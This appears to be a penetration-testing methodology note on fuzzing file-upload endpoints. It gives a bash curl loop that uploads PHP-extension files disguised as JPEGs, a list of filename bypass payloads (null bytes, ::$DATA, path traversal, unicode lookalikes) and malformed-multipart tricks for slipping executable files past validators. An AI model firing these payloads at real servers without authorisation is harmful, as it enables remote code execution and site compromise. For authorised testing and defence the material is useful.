# Fuzzing Uploads — systematic fuzzing of the endpoint

## The dimensions worth fuzzing — in priority order

```
1. extension          — the exec-ext sweep (per stack)
2. Content-Type       — spoof set
3. magic prefix       — the sniff set
4. filename shape     — traversal/case/junk/unicode
5. part structure     — dup parts, dup headers, filename*, boundaries
6. size               — 0/1/huge/boundary
7. encoding           — url/b64/data-uri/gz
```

Each axis is ONE variable — matrix across them is combinatorial; run the
axes in sequence, keep the passing payload as the new baseline.

## The canary design — the file that reports back

A canary file should reveal what happened to it:

- content marker `MK_<rand>` — grep fetch/extract output for it
- filename marker — find where it lands
- type marker — `Content-Type: image/png` real + `.php` ext — which check
  killed it tells which layer ran
- a `__MARKER__` string at 5 positions (head, mid, tail) — a truncation
  or partial-read check reveals itself when only the head survives

## The response-diff loop — classify each response

```
status     — 2xx accept / 4xx reject / 5xx pipeline crash
body       — error text names the validator
headers    — Location/path echo, X-Accel, type headers
timing     — processing time = pipeline depth
follow-up fetch — served? verdict from upload_probe verify
```

Automate the classify — a 400-with-different-text for each rejection is a
fingerprint of which validator ran.

## `variant_matrix`-style probing — one shape per probe round

The repo pattern for "which payload shape does the input react to": one
request per SHAPE at one point, baseline-diffed. For uploads, the matrix
is `ext × type × magic` — run it as a scripted loop and diff the
responses:

```bash
for ext in php phtml pht phar PhP PHP5 jpg; do
  curl -s -o /dev/null -w "%{http_code} " -F "f=@m.$ext;type=image/jpeg" $BASE/upload
done
```

Record the per-shape verdict — the anomaly (one accepted, all else 400)
is the bypass.

## Fuzzing filename shapes — the traversal/hidden-char sweep

```
x.php, x.phtml, x.php.jpg, x.jpg.php, x.PhP, x.PHP, x.php., "x.php ",
x.php%00.jpg, x.php\x00.jpg, "x.php\n.jpg", x.php;.jpg, x.php::$DATA,
../x.php, ....//x.php, ..\\x.php, /x.php, x%2f..%2fx.php, %2e%2e/x.php,
x.pＨp, x․php, x.phṗ
```

## Fuzzing part structure — the multipart matrix

```
dup part (same name, both orders)
dup Content-Type inside a part
filename + filename*
filename"quote / ;semicolon / \escape
missing Content-Type
missing filename=
boundary with spaces / --B mid-body / tail bytes after --B--
Content-Transfer-Encoding: base64 / quoted-printable on the part
chunked vs Content-Length
```

## Fuzzing by mutation — mutate a known-good upload

Take the successful marker request and mutate ONE byte/field at a time —
the minimal fuzzing loop:

- flip each header byte
- truncate the body mid-payload
- insert a NUL/CR/LF at each position of the name
- change each `boundary` char

The response-shape diff between accepted and rejected pinpoints what the
validator reads.

## What to log per probe

```
request-id | ext | type | magic | filename | status | reject-text-class | fetch-verdict
```

The fetch-verdict column (`served-raw`/`executed`/`gone`) is the answer —
status alone lies.

## Falsifiers

- every variant in every axis hits the same validation — the layer is
  airtight; the remaining question is whether OTHER layers exist
